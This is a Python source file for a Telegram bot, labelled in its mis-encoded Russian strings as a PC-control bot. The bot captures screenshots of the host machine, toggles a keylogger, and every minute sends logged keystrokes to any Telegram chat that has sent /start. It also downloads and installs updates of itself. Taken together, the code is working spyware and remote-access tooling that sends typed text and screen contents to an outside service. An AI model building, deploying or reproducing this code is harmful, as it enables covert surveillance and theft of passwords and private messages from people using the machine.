import asyncio
import logging
import os
import threading
import time
from io import BytesIO

from dotenv import load_dotenv
from PIL import Image
import mss

from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

from keylogger import keylogger
from updater import updater


logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)


def load_environment_variables() -> None:
    load_dotenv(override=False)


def get_bot_token_from_env() -> str:
    token = os.getenv("BOT_TOKEN", "").strip()
    if not token:
        raise RuntimeError(
            "–ù–µ –Ω–∞–π–¥–µ–Ω BOT_TOKEN. –°–æ–∑–¥–∞–π—Ç–µ —Ñ–∞–π–ª .env (–Ω–∞ –æ—Å–Ω–æ–≤–µ .env.example) –∏ —É–∫–∞–∂–∏—Ç–µ —Ç–æ–∫–µ–Ω."
        )
    return token


def build_main_keyboard() -> ReplyKeyboardMarkup:
    keyboard = [
        [KeyboardButton(text="üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç")],
        [KeyboardButton(text="‚å®Ô∏è –ö–µ–π–ª–æ–≥–≥–µ—Ä –í–ö–õ"), KeyboardButton(text="‚å®Ô∏è –ö–µ–π–ª–æ–≥–≥–µ—Ä –í–´–ö–õ")],
        [KeyboardButton(text="üîÑ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è"), KeyboardButton(text="‚¨ÜÔ∏è –û–±–Ω–æ–≤–∏—Ç—å")],
    ]
    return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True, one_time_keyboard=False)


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # –î–æ–±–∞–≤–ª—è–µ–º —á–∞—Ç –≤ —Å–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω—ã—Ö
    active_chats.add(update.effective_chat.id)
    
    status = "–í–ö–õ" if keylogger.is_running() else "–í–´–ö–õ"
    current_version = updater.get_current_version()
    await update.message.reply_text(
        text=(
            "–ü—Ä–∏–≤–µ—Ç! –Ø –±–æ—Ç –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ü–ö.\n"
            f"–í–µ—Ä—Å–∏—è: {current_version}\n"
            f"–ö–µ–π–ª–æ–≥–≥–µ—Ä: {status}\n"
            "–î–æ—Å—Ç—É–ø–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è:\n"
            "‚Ä¢ üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç ‚Äî —Å–Ω–∏–º–æ–∫ —ç–∫—Ä–∞–Ω–∞\n"
            "‚Ä¢ ‚å®Ô∏è –ö–µ–π–ª–æ–≥–≥–µ—Ä –í–ö–õ/–í–´–ö–õ ‚Äî –∑–∞—Ö–≤–∞—Ç –∫–ª–∞–≤–∏—à\n"
            "‚Ä¢ üîÑ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è ‚Äî –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –Ω–æ–≤—ã–µ –≤–µ—Ä—Å–∏–∏\n"
            "‚Ä¢ ‚¨ÜÔ∏è –û–±–Ω–æ–≤–∏—Ç—å ‚Äî —Å–∫–∞—á–∞—Ç—å –∏ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ"
        ),
        reply_markup=build_main_keyboard(),
        parse_mode=ParseMode.HTML,
    )


def capture_screenshot_bytes() -> bytes:
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        raw = sct.grab(monitor)
        image = Image.frombytes("RGB", raw.size, raw.rgb)
        buffer = BytesIO()
        image.save(buffer, format="PNG")
        return buffer.getvalue()


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.message.text:
        return

    text = update.message.text.strip()
    if text == "üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç":
        try:
            await update.message.chat.send_action(action="upload_photo")
            photo_bytes = capture_screenshot_bytes()
            await update.message.reply_photo(photo=photo_bytes, caption="–°–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞")
        except Exception as error:  # noqa: BLE001
            logger.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞")
            await update.message.reply_text(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {error}")
        return
    
    elif text == "‚å®Ô∏è –ö–µ–π–ª–æ–≥–≥–µ—Ä –í–ö–õ":
        try:
            keylogger.start_logging()
            await update.message.reply_text("‚úÖ –ö–µ–π–ª–æ–≥–≥–µ—Ä –≤–∫–ª—é—á—ë–Ω. –ö–∞–∂–¥—É—é –º–∏–Ω—É—Ç—É –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å—Å—è –Ω–∞–∫–æ–ø–ª–µ–Ω–Ω—ã–π —Ç–µ–∫—Å—Ç.")
        except Exception as error:
            logger.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–∫–ª—é—á–µ–Ω–∏–∏ –∫–µ–π–ª–æ–≥–≥–µ—Ä–∞")
            await update.message.reply_text(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–∫–ª—é—á–µ–Ω–∏–∏ –∫–µ–π–ª–æ–≥–≥–µ—Ä–∞: {error}")
        return
    
    elif text == "‚å®Ô∏è –ö–µ–π–ª–æ–≥–≥–µ—Ä –í–´–ö–õ":
        try:
            keylogger.stop_logging()
            await update.message.reply_text("‚ùå –ö–µ–π–ª–æ–≥–≥–µ—Ä –≤—ã–∫–ª—é—á–µ–Ω.")
        except Exception as error:
            logger.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–∫–ª—é—á–µ–Ω–∏–∏ –∫–µ–π–ª–æ–≥–≥–µ—Ä–∞")
            await update.message.reply_text(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–∫–ª—é—á–µ–Ω–∏–∏ –∫–µ–π–ª–æ–≥–≥–µ—Ä–∞: {error}")
        return
    
    elif text == "üîÑ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è":
        try:
            await update.message.reply_text("üîç –ü—Ä–æ–≤–µ—Ä—è—é –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è...")
            has_update, version, message = updater.check_for_updates()
            
            if has_update:
                await update.message.reply_text(
                    f"‚úÖ –ù–∞–π–¥–µ–Ω–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ!\n"
                    f"–ù–æ–≤–∞—è –≤–µ—Ä—Å–∏—è: {version}\n"
                    f"–ù–∞–∂–º–∏—Ç–µ '‚¨ÜÔ∏è –û–±–Ω–æ–≤–∏—Ç—å' –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏"
                )
            else:
                await update.message.reply_text(f"‚ÑπÔ∏è {message}")
        except Exception as error:
            logger.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π")
            await update.message.reply_text(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π: {error}")
        return
    
    elif text == "‚¨ÜÔ∏è –û–±–Ω–æ–≤–∏—Ç—å":
        try:
            await update.message.reply_text("‚¨ÜÔ∏è –ù–∞—á–∏–Ω–∞—é –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ...")
            success, message = updater.update()
            
            if success:
                await update.message.reply_text(
                    f"‚úÖ {message}\n"
                    f"–ë–æ—Ç –±—É–¥–µ—Ç –ø–µ—Ä–µ–∑–∞–ø—É—â–µ–Ω —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã..."
                )
                # –î–∞—ë–º –≤—Ä–µ–º—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ
                await asyncio.sleep(3)
                # –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞
                updater.restart_bot()
            else:
                await update.message.reply_text(f"‚ùå {message}")
        except Exception as error:
            logger.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏")
            await update.message.reply_text(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏: {error}")
        return

    await update.message.reply_text(
        "–ù–µ –ø–æ–Ω—è–ª –∑–∞–ø—Ä–æ—Å. –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–µ –∏–ª–∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ /start",
        reply_markup=build_main_keyboard(),
    )


# –ì–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∞–∫—Ç–∏–≤–Ω—ã—Ö —á–∞—Ç–æ–≤
active_chats = set()

async def periodic_keylogger_sender(application):
    """–§–æ–Ω–æ–≤–∞—è –∑–∞–¥–∞—á–∞ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–∞–∫–æ–ø–ª–µ–Ω–Ω–æ–≥–æ —Ç–µ–∫—Å—Ç–∞ –∫–∞–∂–¥—É—é –º–∏–Ω—É—Ç—É."""
    while True:
        try:
            await asyncio.sleep(60)  # –∫–∞–∂–¥—É—é –º–∏–Ω—É—Ç—É
            if keylogger.is_running():
                text = keylogger.get_accumulated_text()
                if text.strip():  # –µ—Å–ª–∏ –µ—Å—Ç—å —Ç–µ–∫—Å—Ç
                    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤—Å–µ–º –∞–∫—Ç–∏–≤–Ω—ã–º —á–∞—Ç–∞–º
                    for chat_id in active_chats.copy():
                        try:
                            # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª–∏–Ω—É —Å–æ–æ–±—â–µ–Ω–∏—è (Telegram –ª–∏–º–∏—Ç ~4000 —Å–∏–º–≤–æ–ª–æ–≤)
                            if len(text) > 3000:
                                text_to_send = text[:3000] + "\n... (–æ–±—Ä–µ–∑–∞–Ω–æ)"
                            else:
                                text_to_send = text
                            
                            await application.bot.send_message(
                                chat_id=chat_id,
                                text=f"‚å®Ô∏è –ù–∞–∫–æ–ø–ª–µ–Ω–Ω—ã–π —Ç–µ–∫—Å—Ç –∑–∞ –º–∏–Ω—É—Ç—É:\n\n{text_to_send}"
                            )
                        except Exception as e:
                            logger.warning(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –≤ —á–∞—Ç {chat_id}: {e}")
                            # –£–¥–∞–ª—è–µ–º –Ω–µ–∞–∫—Ç–∏–≤–Ω—ã–π —á–∞—Ç
                            active_chats.discard(chat_id)
        except Exception as e:
            logger.exception("–û—à–∏–±–∫–∞ –≤ –ø–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–æ–π –æ—Ç–ø—Ä–∞–≤–∫–µ –∫–µ–π–ª–æ–≥–≥–µ—Ä–∞: %s", e)


async def main() -> None:
    load_environment_variables()
    token = get_bot_token_from_env()

    application = ApplicationBuilder().token(token).build()
    application.add_handler(CommandHandler("start", cmd_start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    logger.info("–ë–æ—Ç –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è... –ù–∞–∂–º–∏—Ç–µ Ctrl+C –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏.")
    await application.initialize()
    await application.start()
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º —Ñ–æ–Ω–æ–≤—É—é –∑–∞–¥–∞—á—É –¥–ª—è –∫–µ–π–ª–æ–≥–≥–µ—Ä–∞
    keylogger_task = asyncio.create_task(periodic_keylogger_sender(application))
    
    try:
        await application.updater.start_polling()
        while True:
            await asyncio.sleep(3600)
    finally:
        keylogger_task.cancel()
        await application.updater.stop()
        await application.stop()
        await application.shutdown()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("–ë–æ—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º.")


